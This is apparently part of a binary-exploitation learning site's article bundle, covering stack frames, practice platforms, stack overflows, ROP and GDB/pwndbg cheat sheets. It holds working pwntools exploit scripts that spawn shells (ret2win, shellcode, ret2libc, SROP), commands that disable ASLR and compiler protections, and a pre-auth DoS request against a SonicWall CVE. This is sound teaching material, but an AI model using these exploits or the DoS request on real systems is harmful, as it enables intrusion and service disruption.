- **EIP** (Instruction Pointer): Points to the next instruction to execute.
- **ESP** (Stack Pointer): Points to the **top** of the stack (lowest address currently in use). Moves down on push/call.
- **EBP** (Base/Frame Pointer): Points to the **base** (higher address) of the current function's frame. Used for easy access to locals.

![x86 Assembly and Call Stack | Computer Security](https://textbook.cs161.org/assets/images/memory-safety/x86/stack7.png)

[textbook.cs161.org](https://textbook.cs161.org/memory-safety/x86.html)

![Stack Frames & Pointers | Cameron Wickes](https://www.cameronwickes.co.uk/_nuxt/uploads/9072fc7-640.jpg)

[cameronwickes.co.uk](https://www.cameronwickes.co.uk/stack-frames-pointers/)

### Detailed Stack Frame Layout (One Function's Space)

When a function is called (function prologue):

1. call instruction pushes the return address and jumps.
2. push ebp saves old EBP.
3. mov ebp, esp sets new frame.
4. sub esp, N allocates space for locals (moves ESP down).

Layout from **high address** to **low address**:

![The details of C function stack (and heap) operation when function ...](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2_files/image005.png)

[tenouk.com](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html)

![Understanding the Stack — A Precursor to exploiting Buffer ...](https://miro.medium.com/0*0_ldrMQW__kRL7HV.jpg)

[blog.devgenius.io](https://blog.devgenius.io/understanding-the-stack-a-precursor-to-exploiting-buffer-overflow-8c6972fdb4ac)

![Stack Frames & Pointers | Cameron Wickes](https://www.cameronwickes.co.uk/_nuxt/uploads/9072fc7-640.jpg)

[cameronwickes.co.uk](https://www.cameronwickes.co.uk/stack-frames-pointers/)

![The details of C function stack (and heap) operation when function ...](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2_files/image011.png)

[tenouk.com](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html)

![Lab 3: Assembly and Buffer Overflow - HackMD](https://cs.brown.edu/courses/csci1310/2020/assign/labs/assets/lab3-stack6.png)

[cs.brown.edu](https://cs.brown.edu/courses/csci1310/2020/assign/labs/lab3.html)

![Understanding the Stack — A Precursor to exploiting Buffer ...](https://miro.medium.com/v2/resize:fit:1350/0*K992sQOanLQaLOat.jpg)

[blog.devgenius.io](https://blog.devgenius.io/understanding-the-stack-a-precursor-to-exploiting-buffer-overflow-8c6972fdb4ac)

- **Arguments** (pushed by caller, higher than EBP)
- **Saved EIP** (return address – critical for control flow)
- **Saved EBP** (old frame pointer)
- **Local variables/buffers** (allocated by sub esp)
- ESP points here ↓ (grows down)

### Why This Matters for Exploits: Buffer Overflow

Vulnerable code like strcpy(buffer, input) doesn't check size. If you send too much input:

- It fills the buffer.
- Overflows into saved EBP.
- Then overwrites **saved EIP** (return address).

When function returns (ret): Pops EIP → program jumps to your controlled address → code execution!

![If the stack grows downwards, how can a buffer overflow overwrite ...](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTjqDfS9DMaYATcVJ0CmgO2GuDD0X2IQ3Sv36264Z1Rvi70ZsM&s)

[security.stackexchange.com](https://security.stackexchange.com/questions/135786/if-the-stack-grows-downwards-how-can-a-buffer-overflow-overwrite-content-above)

![Call Stack - buffer overflow vulnerability | ZeroBone](https://zerobone.net/assets/img/blog/call-stack-buffer-overflow-tmb@0,5x.jpg)

[zerobone.net](https://zerobone.net/blog/cs/call-stack-buffer-overflow/)

![Windows Exploit Development With Buffer Overflow Example 1 | by ...](https://miro.medium.com/1*srairTVcbwgy9pvT9zq7rg.jpeg)

[whichbuffer.medium.com](https://whichbuffer.medium.com/windows-exploit-development-with-buffer-overflow-example-1-158ddcc029fe)

![28 Security — An Introduction to Computer Networks, unicode-safer ...](https://intronetworks.cs.luc.edu/current/uhtml/_images/basic_stack_overflow.svg)

[intronetworks.cs.luc.edu](https://intronetworks.cs.luc.edu/current/uhtml/security.html)

Classic stack smashing: Overflow travels "up" the frame (towards higher addresses) to hit the return address.

This is the foundation of basic binary exploitation (what you're learning now). Modern protections (ASLR, NX, Stack Canaries) make it harder, but understanding the raw stack is key to everything else (ROP, heap exploits, etc.).`},{id:`practice-platforms`,title:`Practice Platforms — Pwn & Reverse Engineering`,excerpt:`Curated list of platforms for practicing binary exploitation skills including wargames, CTF archives, and vulnerable-by-design applications.`,category:`Binary Exploitation`,content:`# Practice Platforms — Pwn & Reverse Engineering
> Sources: [Crypto-Cat CTF Resources](https://github.com/Crypto-Cat/CTF#readme) | [HackTricks](https://book.hacktricks.wiki/)

---

## Pwn / Binary Exploitation

| Platform | Focus | Link |
|---|---|---|
| **pwn.college** | Structured binary exploitation course | [pwn.college](https://pwn.college/) |
| **ROP Emporium** | Progressive ROP challenges (8 levels) | [ropemporium.com](https://ropemporium.com/) |
| **Exploit Education** | Phoenix — stack, heap, format strings | [exploit.education](https://exploit.education/) |
| **How2Heap** | Heap exploitation techniques (shellphish) | [GitHub](https://github.com/shellphish/how2heap) |
| **Pwnable.kr** | Classic pwn challenges | [pwnable.kr](https://pwnable.kr/) |
| **Nightmare** | Binary exploitation with walkthroughs | [guyinatuxedo.github.io](https://guyinatuxedo.github.io/) |
| **Ir0nstone** | Binexp notes & challenges | [ir0nstone.gitbook.io](https://ir0nstone.gitbook.io/notes) |
| **Microcorruption** | Embedded CTF (MSP430 assembly) | [microcorruption.com](https://microcorruption.com/) |

---

## Reverse Engineering

| Platform | Focus | Link |
|---|---|---|
| **Challenges.re** | RE challenges by difficulty | [challenges.re](https://challenges.re/) |
| **CrackMes** | User-submitted crackmes | [crackmes.one](https://crackmes.one/) |
| **OpenSecurityTraining2** | Free RE/security courses | [p.ost2.fyi](https://p.ost2.fyi/courses) |
| **Azeria Labs** | ARM assembly & exploitation | [azeria-labs.com](https://azeria-labs.com/writing-arm-assembly-part-1/) |
| **GuidedHacking** | Game hacking & RE | [guidedhacking.com](https://guidedhacking.com/) |

---

## CTF Platforms (General)

| Platform | Link |
|---|---|
| **CTFTime** | [ctftime.org](https://ctftime.org/) |
| **PicoCTF** | [play.picoctf.org](https://play.picoctf.org/) |
| **OverTheWire** | [overthewire.org](https://overthewire.org/wargames/) |
| **ImaginaryCTF** | [imaginaryctf.org](https://imaginaryctf.org/) |
| **247CTF** | [247ctf.com](https://247ctf.com/) |
| **CryptoHack** | [cryptohack.org](https://cryptohack.org/) |
| **Google CTF** | [capturetheflag.withgoogle.com](https://capturetheflag.withgoogle.com/) |
| **Hacker 101** | [ctf.hacker101.com](https://ctf.hacker101.com/) |

---

## Pentesting Labs

| Platform | Link |
|---|---|
| **HackTheBox** | [hackthebox.com](https://www.hackthebox.com/) |
| **TryHackMe** | [tryhackme.com](https://tryhackme.com/) |
| **OffSec Proving Grounds** | [offsec.com](https://www.offsec.com/products/proving-grounds/) |
| **Web Security Academy** | [portswigger.net](https://portswigger.net/web-security) |
| **PentesterLab** | [pentesterlab.com](https://pentesterlab.com/) |
| **DVWA** | [GitHub](https://github.com/digininja/DVWA) |
| **Juice Shop** | [GitHub](https://github.com/juice-shop/juice-shop-ctf) |

---

## Blue Team / DFIR

| Platform | Link |
|---|---|
| **DFIR Labs** | [dfirlabs.thedfirreport.com](https://dfirlabs.thedfirreport.com/) |
| **XINTRA** | [xintra.org](https://www.xintra.org/) |
| **LetsDefend** | [letsdefend.io](https://letsdefend.io/) |
| **Blue Team Labs Online** | [blueteamlabs.online](https://blueteamlabs.online/) |
| **CyberDefenders** | [cyberdefenders.org](https://cyberdefenders.org/) |

---

## Crypto-Cat Recommended Learning Paths

### Binary Exploitation 101 (11 videos)
[YouTube Playlist](https://youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec8)

1. **00 — Intro** → Environment setup, tools, basic concepts
2. **01 — Overwriting Variables** → Stack overflow basics
3. **02 — Overwriting Functions** → Redirect execution
4. **03 — Shellcode Intro** → NX disabled exploitation
5. **04 — Shellcoding** → Custom shellcode injection
6. **05 — Intro to ROP** → Return Oriented Programming
7. **06 — ret2libc** → Using libc functions
8. **07 — Format Strings** → Read/write arbitrary memory
9. **08 — Leak PIE + ret2libc** → Bypass PIE
10. **09 — Leak canary + ret2libc** → Bypass stack canary
11. **10 — Bypassing Canaries** → Brute force & leak techniques

### ROP Emporium (8 challenges)
[YouTube Playlist](https://youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec8)

1. ret2win → 2. split → 3. callme → 4. write4 → 5. badchars → 6. fluff → 7. pivot → 8. ret2csu

---

## Compilation Cheat Sheet (for practice)

\`\`\`bash
# All protections OFF (easiest)
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32

# 64-bit, no protections
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie

# With NX (no shellcode on stack)
gcc vuln.c -o vuln -fno-stack-protector -no-pie

# Everything ON (hardest)
gcc vuln.c -o vuln -fstack-protector-all -pie -z relro -z now

# Disable ASLR system-wide
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
\`\`\`
`},{id:`stack-overflow`,title:`Stack Overflow`,excerpt:`Stack-based buffer overflow exploitation covering return address overwrite, shellcode injection, NOP sleds, and controlling program execution flow.`,category:`Binary Exploitation`,content:`# Stack Overflow
> Sources: [HackTricks - Stack Overflow](https://book.hacktricks.wiki/en/binary-exploitation/stack-overflow/index.html) | [Crypto-Cat Binary Exploitation 101](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101)

---

## What is a Stack Overflow?

A **stack overflow** occurs when a program writes more data to the stack than allocated. This overwrites adjacent memory — including the **saved return address (EIP/RIP)** and **saved base pointer (EBP/RBP)**.

### Vulnerable Functions
\`\`\`c
gets(buffer);        // NEVER use - no bounds checking
strcpy(dst, src);    // No length limit
strcat(dst, src);    // No length limit
sprintf(buf, fmt);   // No length limit
scanf("%s", buf);    // No length limit

// These CAN be vulnerable if length > allocation:
fgets(buf, len, fp); 
read(fd, buf, len);
memcpy(dst, src, len);
\`\`\`

### Example Vulnerable Code
\`\`\`c
void vulnerable() {
    char buffer[128];
    printf("Enter some text: ");
    gets(buffer); // <-- OVERFLOW HERE
    printf("You entered: %s\\n", buffer);
}
\`\`\`

---

## Finding the Offset

### Method 1: De Bruijn Sequence (pwntools)
\`\`\`python
from pwn import *

# Generate pattern
pattern = cyclic(1000)

# After crash, find offset from EIP value
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)
print(f"Offset: {offset}")
\`\`\`

### Method 2: GEF/GDB
\`\`\`bash
# Generate pattern
pattern create 200

# After crash, find offset
pattern search $rsp
pattern search "avaaawaa"
\`\`\`

### Method 3: Manual
\`\`\`python
# Send increasing 'A's until crash
python3 -c 'print("A"*1000)' | ./binary
# If crash at 0x41414141 → you control EIP
\`\`\`

---

## Exploitation Techniques

### 1. Ret2win (Simplest)
There's a hidden function (e.g., \`win()\`, \`flag()\`) that's never called. Overwrite return address to call it.

\`\`\`python
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

offset = 76  # found via pattern
win_addr = elf.symbols['win']  # or find via objdump

payload = b'A' * offset
payload += p32(win_addr)

p.sendline(payload)
p.interactive()
\`\`\`

### 2. Ret2win with Parameters (64-bit)
In x86-64, first 6 args go in registers: \`RDI, RSI, RDX, RCX, R8, R9\`

\`\`\`python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # stack alignment

payload = b'A' * offset
payload += p64(ret)           # align stack (Ubuntu 18.04+)
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)    # arg1
payload += p64(elf.symbols['win'])

p.sendline(payload)
\`\`\`

### 3. Stack Shellcode (NX disabled)
\`\`\`python
from pwn import *

context.arch = 'i386'  # or 'amd64'
shellcode = asm(shellcraft.sh())

buf_addr = 0xffffd080  # address of buffer (no ASLR)

payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p32(buf_addr)

p.sendline(payload)
\`\`\`

### 4. Ret2libc (NX enabled)
\`\`\`python
from pwn import *

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('./vuln')

# If ASLR disabled:
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p32(system)
payload += p32(0xdeadbeef)  # fake return addr
payload += p32(bin_sh)

p.sendline(payload)
\`\`\`

---

## 64-bit vs 32-bit Key Differences

| Feature | 32-bit | 64-bit |
|---|---|---|
| Addresses | 4 bytes | 8 bytes |
| Args passing | Stack | RDI, RSI, RDX, RCX, R8, R9 |
| Return addr | \`p32()\` | \`p64()\` |
| Stack alignment | Not needed | Need \`ret\` gadget before function calls |
| ROP gadgets | \`pop eax; ret\` | \`pop rdi; ret\` etc. |

---

## Real-World CVE Examples (from HackTricks)

### CVE-2025-40596 (SonicWall SMA100)
\`\`\`c
char version[3];
char endpoint[0x800] = {0};
// No length limit on %s!
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
\`\`\`
\`\`\`python
# Pre-auth DoS
import requests
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
\`\`\`

### CVE-2025-12686 (Synology BeeStation - Pwn2Own 2025)
- Pre-auth overflow in Base64-decoded JSON
- Fork-based server → all children share same canary
- Brute-force canary byte-by-byte using HTTP response oracle (200 vs 502)
- Once canary + PIE base known → ROP chain to \`execl("/bin/bash")\`

---

## References
- [HackTricks Stack Overflow](https://book.hacktricks.wiki/en/binary-exploitation/stack-overflow/index.html)
- [Crypto-Cat: Overwriting Stack Variables](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/01-overwriting_stack_variables_part1)
- [Crypto-Cat: Return to Win](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/03-return_to_win)
- [Crypto-Cat: Custom Shellcode](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/05-injecting_custom_shellcode)
- [Crypto-Cat: Return to Libc](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/06-return_to_libc)
`},{id:`rop-fundamentals`,title:`Return Oriented Programming (ROP)`,excerpt:`Return-oriented programming fundamentals including gadget discovery, chain construction, ret2libc, and bypassing NX protection through code reuse attacks.`,category:`Binary Exploitation`,content:`# Return Oriented Programming (ROP)
> Sources: [HackTricks - ROP](https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/index.html) | [Crypto-Cat ROP Emporium](https://github.com/Crypto-Cat/CTF/tree/main/pwn/rop_emporium) ([VIDEO Series](https://www.youtube.com/watch?v=oBZy0bGNezo&list=PLHUKi1UlEgOKAVRdiMlpX6hgayiY6dTwu))

---

## What is ROP?

**Return Oriented Programming** chains together small instruction sequences ending in \`ret\` (called **gadgets**) from the binary itself to perform arbitrary actions — bypassing **NX/DEP** (non-executable stack).

\`\`\`
[overflow padding] → [gadget1_addr] → [gadget2_addr] → ... → [function_addr]
\`\`\`

---

## Finding ROP Gadgets

\`\`\`bash
# ROPgadget
ROPgadget --binary ./vuln
ROPgadget --binary ./vuln --ropchain

# ropper
ropper --file ./vuln
ropper --file ./vuln --search "pop rdi"

# pwntools
from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
\`\`\`

---

## ROP Emporium Challenges (Crypto-Cat)

### 1. Ret2win — Basic ROP
Overwrite return address → call \`ret2win()\` function.

### 2. Split — Function + Argument
Call \`system()\` with \`"/bin/cat flag.txt"\` string that exists in binary.
\`\`\`python
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(useful_string_addr)
payload += p64(system_plt)
\`\`\`

### 3. Callme — Multiple Calls with Args
Call \`callme_one(1, 2, 3)\` → \`callme_two(1, 2, 3)\` → \`callme_three(1, 2, 3)\`.
\`\`\`python
payload = b'A' * offset
for func in [callme_one, callme_two, callme_three]:
    payload += p64(pop_rdi_rsi_rdx)
    payload += p64(1) + p64(2) + p64(3)
    payload += p64(func)
\`\`\`

### 4. Write4 — Write to Memory
Use \`mov [r14], r15; ret\` gadget to write "/bin/sh" to writable section, then call \`system()\`.

### 5. Badchars — Encoding
Some characters are filtered. XOR encode payload, use ROP to decode in memory.

### 6. Fluff — Exotic Gadgets
Same goal as write4 but with unusual gadgets (\`xlatb\`, \`stosb\`, \`bswap\`, etc.).

### 7. Pivot — Stack Pivot
Stack space is limited → pivot to a larger writable area using \`xchg esp, eax; ret\`.

### 8. Ret2csu — __libc_csu_init
Use universal gadgets in \`__libc_csu_init\` to control \`rdx\`, \`rsi\`, \`edi\` and call function pointers.

---

## Common ROP Techniques

### Ret2libc (Bypass NX)
\`\`\`python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Leak puts() address from GOT
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])  # return to main

p.sendline(b'A' * offset + rop.chain())

# Parse leak
leaked_puts = u64(p.recvline()[:6].ljust(8, b'\\x00'))
libc.address = leaked_puts - libc.symbols['puts']

# Second stage - call system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh')))

p.sendline(b'A' * offset + rop2.chain())
p.interactive()
\`\`\`

### Ret2syscall (execve)
\`\`\`python
# 64-bit: syscall number in RAX, args in RDI, RSI, RDX
# execve("/bin/sh", NULL, NULL) = syscall 59

payload = b'A' * offset
payload += p64(pop_rax) + p64(59)           # execve syscall number
payload += p64(pop_rdi) + p64(bin_sh_addr)  # "/bin/sh"
payload += p64(pop_rsi) + p64(0)            # NULL
payload += p64(pop_rdx) + p64(0)            # NULL
payload += p64(syscall_ret)
\`\`\`

### SROP (Sigreturn Oriented Programming)
Use \`sigreturn\` syscall to set ALL registers at once from a fake signal frame.
\`\`\`python
from pwn import *

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = bin_sh_addr # "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_addr
frame.rip = syscall_addr

payload = b'A' * offset
payload += p64(pop_rax) + p64(15)  # sigreturn syscall
payload += p64(syscall_ret)
payload += bytes(frame)
\`\`\`

### Ret2dlresolve
Fake a dynamic symbol resolution to call any libc function without knowing libc base. Complex but powerful against ASLR.

### BROP (Blind ROP)
Remotely discover gadgets by observing crash/no-crash behavior. Requires a fork-based server.

---

## Ret2csu Gadgets

Found in \`__libc_csu_init\` of virtually every dynamically-linked ELF:
\`\`\`
Gadget 1 (pop):
    pop rbx    ; 0
    pop rbp    ; 1
    pop r12    ; function pointer (GOT entry)
    pop r13    ; arg3 (rdx)
    pop r14    ; arg2 (rsi)
    pop r15    ; arg1 (edi)
    ret

Gadget 2 (call):
    mov rdx, r13
    mov rsi, r14
    mov edi, r15d
    call [r12 + rbx*8]
\`\`\`

---

## Stack Alignment (64-bit)
Ubuntu 18.04+ requires 16-byte stack alignment before function calls. Add a \`ret\` gadget if \`system()\` crashes:
\`\`\`python
payload = b'A' * offset
payload += p64(ret_gadget)    # Stack alignment!
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
\`\`\`

---

## References
- [HackTricks ROP](https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/index.html)
- [Crypto-Cat ROP Emporium](https://github.com/Crypto-Cat/CTF/tree/main/pwn/rop_emporium) ([VIDEO](https://www.youtube.com/watch?v=oBZy0bGNezo&list=PLHUKi1UlEgOKAVRdiMlpX6hgayiY6dTwu))
- [Crypto-Cat: Leak PIE + Ret2libc](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/08-leak_pie_ret2libc)
- [ROPEmporium.com](https://ropemporium.com/)
- [Ret2csu HackTricks](https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/ret2csu.html)
- [SROP HackTricks](https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/srop-sigreturn-oriented-programming/index.html)
`},{id:`gdb-debugging-tools`,title:`GDB & Debugging Tools Reference`,excerpt:`Comprehensive guide to GDB and debugging tools for binary exploitation, including breakpoints, memory examination, and essential debugging workflows.`,category:`Binary Exploitation`,content:`# GDB & Debugging Tools Reference
> Complements: [[PWNDBG]] (existing cheat sheet)

---

## GDB with Pwndbg

### Installation
\`\`\`bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
\`\`\`

### Starting
\`\`\`bash
gdb ./binary                    # Load binary
gdb -q ./binary                 # Quiet mode
gdb -p <pid>                    # Attach to process
\`\`\`

### Essential Commands
\`\`\`bash
# Execution
r                               # Run
r < input.txt                   # Run with stdin from file
r $(python3 -c 'print("A"*100)')  # Run with argument
c                               # Continue
ni                              # Next instruction (step over)
si                              # Step instruction (step into)
finish                          # Run until current function returns

# Breakpoints
b main                          # Break at main
b *0x401234                     # Break at address
b *main+42                      # Break at offset
info b                          # List breakpoints
del 1                           # Delete breakpoint #1
disable 1                       # Disable breakpoint #1

# Examination
x/20wx $rsp                     # 20 words hex at RSP
x/s 0x402000                    # String at address
x/10i $rip                      # 10 instructions at RIP
x/20gx $rsp                     # 20 giant (8-byte) hex at RSP
p $rax                          # Print register value
p/x $rax                        # Print in hex
info reg                        # All registers
\`\`\`

### Pwndbg Specific
\`\`\`bash
# Heap
heap                            # Heap overview
bins                            # All bins
vis_heap_chunks                 # Visual heap layout
tcachebins                      # Tcache bins
fastbins                        # Fastbins

# Stack
stack 20                        # Show 20 stack entries
canary                          # Show canary value
retaddr                         # Show return address

# Search
search -s "/bin/sh"             # Search for string
search -p 0xdeadbeef            # Search for pointer

# Analysis  
checksec                        # Show binary protections
vmmap                           # Memory mappings
got                             # GOT entries
plt                             # PLT entries
rop                             # Find ROP gadgets

# Context
context                         # Refresh display
set context-sections all        # Show all sections
\`\`\`

---

## Other Useful Tools

### ROPgadget
\`\`\`bash
ROPgadget --binary ./vuln
ROPgadget --binary ./vuln --ropchain    # Auto-generate chain
ROPgadget --binary ./vuln | grep "pop rdi"
\`\`\`

### ropper
\`\`\`bash
ropper --file ./vuln
ropper --file ./vuln --search "pop rdi"
\`\`\`

### checksec
\`\`\`bash
checksec --file=./vuln
\`\`\`

### objdump
\`\`\`bash
objdump -d ./vuln               # Disassemble
objdump -d ./vuln | grep main   # Find main
objdump -t ./vuln               # Symbol table
objdump -R ./vuln               # Relocations (GOT entries)
\`\`\`

### readelf
\`\`\`bash
readelf -h ./vuln               # ELF header
readelf -S ./vuln               # Sections
readelf -s ./vuln               # Symbols
readelf -l ./vuln               # Program headers
\`\`\`

### one_gadget
\`\`\`bash
# Find one-shot RCE gadgets in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6
\`\`\`

### pwninit
\`\`\`bash
# Auto-patch binary with correct libc/ld
pwninit --bin ./vuln --libc ./libc.so.6
\`\`\`

### seccomp-tools
\`\`\`bash
# Dump seccomp (sandbox) rules
seccomp-tools dump ./vuln
\`\`\`

---

## References
- [Pwndbg GitHub](https://github.com/pwndbg/pwndbg)
- [GEF GitHub](https://github.com/hugsy/gef)
- [PEDA GitHub](https://github.com/longld/peda)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
`},{id:`pwndbg`,title:`GDB + Pwndbg Cheat Sheet`,excerpt:`Guide to using pwndbg, a GDB plugin for exploit development, covering its enhanced commands for heap analysis, register display, and memory inspection.`,category:`Binary Exploitation`,content:`
# GDB + Pwndbg Cheat Sheet
> Sources: [Pwndbg GitHub](https://github.com/pwndbg/pwndbg) | [Crypto-Cat CTF](https://github.com/Crypto-Cat/CTF/tree/main/pwn) | [HackTricks](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)

---

## Starting GDB

\`\`\`bash
gdb-pwndbg ./binary              # With pwndbg
gdb-peda ./binary                # With PEDA
gdb-gef ./binary                 # With GEF
gdb ./binary                     # Vanilla GDB
gdb -q ./binary                  # Quiet mode (no banner)
gdb -p <PID>                     # Attach to running process
\`\`\`

---

## Execution Control

\`\`\`bash
run                               # Start program
run < input.txt                   # Run with file as stdin
run $(python3 -c 'print("A"*100)')  # Run with argument
continue (c)                      # Continue execution
nexti (ni)                        # Step one instruction (OVER calls)
stepi (si)                        # Step one instruction (INTO calls)
finish                            # Run until current function returns
until *0x401234                   # Run until address
set $rip = 0x401234               # Jump to address (change EIP/RIP)
jump *main+525                    # Jump directly to address
\`\`\`

---

## Breakpoints

\`\`\`bash
break main                        # Break at function
break *0x8049123                  # Break at exact address
break *main+42                    # Break at offset into function
break *0x401234 if $rax == 0      # Conditional breakpoint
info breakpoints (info b)         # List all breakpoints
delete 1                          # Delete breakpoint #1
delete                            # Delete ALL breakpoints
disable 1                         # Disable breakpoint #1
enable 1                          # Enable breakpoint #1
tbreak *0x401234                  # Temporary (hit once, auto-delete)
\`\`\`

---

## Examining Memory (x command)

**Format:** \`x/NFU address\` → N=count, F=format, U=unit size

\`\`\`bash
# Formats: x=hex, d=decimal, s=string, i=instruction, c=char
# Units:   b=byte, h=halfword(2), w=word(4), g=giant(8)

x/10i $rip                       # 10 instructions at RIP
x/20gx $rsp                      # 20 qwords (8-byte) hex at stack top
x/40wx $esp                      # 40 words (4-byte) hex at ESP (32-bit)
x/s 0x402000                     # String at address
x/10s $rsp                       # 10 strings starting at RSP
x/20bx $rsp                      # 20 bytes hex at RSP
x/i $rip                         # Single instruction at RIP
x/50i main                       # Disassemble 50 instructions of main
\`\`\`

---

## Registers

\`\`\`bash
info registers (info reg)         # All general registers
info all-registers                # ALL registers (including FP, SSE)
p $rax                            # Print single register
p/x $rax                          # Print in hex
p/d $rax                          # Print in decimal
p/t $rax                          # Print in binary
set $rax = 0x41414141             # Modify register value
set $rip = 0x401234               # Redirect execution
\`\`\`

### Key Registers for Exploitation

**x86-64:**
| Register | Purpose |
|---|---|
| \`RIP\` | Instruction pointer (next instruction) |
| \`RSP\` | Stack pointer (top of stack) |
| \`RBP\` | Base pointer (stack frame base) |
| \`RDI\` | 1st argument |
| \`RSI\` | 2nd argument |
| \`RDX\` | 3rd argument |
| \`RCX\` | 4th argument |
| \`R8\`  | 5th argument |
| \`R9\`  | 6th argument |
| \`RAX\` | Return value |

**x86 (32-bit):** Arguments are pushed on the stack right-to-left.

---

## Pwndbg-Specific Commands

\`\`\`bash
# Context display
context                           # Refresh full display
set context-sections all          # Show everything
set context-sections regs,disasm,stack,backtrace

# Security
checksec                          # Show binary protections

# Memory map
vmmap                             # Memory mappings (like /proc/pid/maps)
vmmap libc                        # Find libc base address

# GOT / PLT
got                               # Display GOT entries (resolved addresses)
plt                               # Display PLT entries

# Stack
stack 30                          # Show 30 stack entries
canary                            # Show stack canary value
retaddr                           # Show return address on stack

# Heap (critical for heap exploitation)
heap                              # Heap overview
vis_heap_chunks                   # Visual heap layout
bins                              # All bins (tcache, fast, unsorted, small, large)
tcachebins                        # Tcache bins specifically
fastbins                          # Fastbin entries
unsortedbin                       # Unsorted bin
smallbins                         # Small bins
largebins                         # Large bins
top_chunk                         # Top chunk info
malloc_chunk <addr>               # Inspect specific chunk

# Search
search -s "/bin/sh"               # Search for string in memory
search -p 0xdeadbeef              # Search for pointer/value
search -s "flag{" .               # Search in current binary only

# ROP
rop                               # Find ROP gadgets
rop --grep "pop rdi"              # Filter ROP gadgets

# Cyclic pattern (for offset finding)
cyclic 200                        # Generate pattern
cyclic -l 0x61616166              # Find offset from pattern value
\`\`\`

---

## Debugging Exploitation Techniques

### Finding Buffer Overflow Offset
\`\`\`bash
# Method 1: Pwndbg cyclic
pwndbg> cyclic 200                # Generate pattern
pwndbg> run                       # Paste pattern as input
# After crash:
pwndbg> cyclic -l $rsp            # x64: look at RSP
pwndbg> cyclic -l $eip            # x86: look at EIP

# Method 2: Manual
pwndbg> run <<< $(python3 -c 'print("A"*100 + "BBBB")')
# Check if EIP/RIP = 0x42424242
\`\`\`

### Setting Up for Pwntools GDB Attach
\`\`\`python
# In your exploit script:
io = gdb.debug('./binary', '''
    break main
    break *0x401234
    continue
''')
\`\`\`

### Examining the Stack Frame
\`\`\`bash
# After hitting breakpoint in vulnerable function:
info frame                        # Current frame info
backtrace (bt)                    # Full call stack
x/20gx $rbp-0x40                 # Look at local variables
x/20gx $rsp                      # Look at stack from top

# Find distance from buffer to return address
p/d $rbp - <buffer_address> + 8  # +8 for saved RBP (x64)
\`\`\`

### Verifying Exploit Payloads
\`\`\`bash
# Before function return:
x/gx $rbp+8                      # Check what return address will be
x/10gx $rsp                      # After ret, check ROP chain on stack

# Check if shellcode landed correctly:
x/20i <shellcode_address>         # Disassemble your shellcode
\`\`\`

---

## Tips & Tricks

\`\`\`bash
# Follow the child in fork
set follow-fork-mode child
set detach-on-fork off

# Disable ASLR in GDB (default)
set disable-randomization on      # Already default

# Continue on signals (useful for SIGSEGV analysis)
handle SIGSEGV nostop noprint pass

# Python in GDB
python print(hex(gdb.parse_and_eval("$rsp")))

# Log all output
set logging on
set logging file gdb.log

# Load symbols from separate file
symbol-file ./binary.debug

# Disassemble in Intel syntax
set disassembly-flavor intel
\`\`\`

---

## GDB Plugin Comparison

| Feature | Pwndbg | GEF | PEDA |
|---|---|---|---|
| Heap analysis | Excellent | Good | Basic |
| ROP search | Built-in | Built-in | Basic |
| Context display | Best | Good | Good |
| Heap visualization | \`vis_heap_chunks\` | \`heap bins\` | Limited |
| Active development | Very active | Active | Slow |
| Best for | Pwn/heap | General | Beginners |

---

## References
- [Pwndbg GitHub](https://github.com/pwndbg/pwndbg)
- [GEF GitHub](https://github.com/hugsy/gef)
- [PEDA GitHub](https://github.com/longld/peda)
- [Crypto-Cat: GDB in Binary Exploitation](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101)
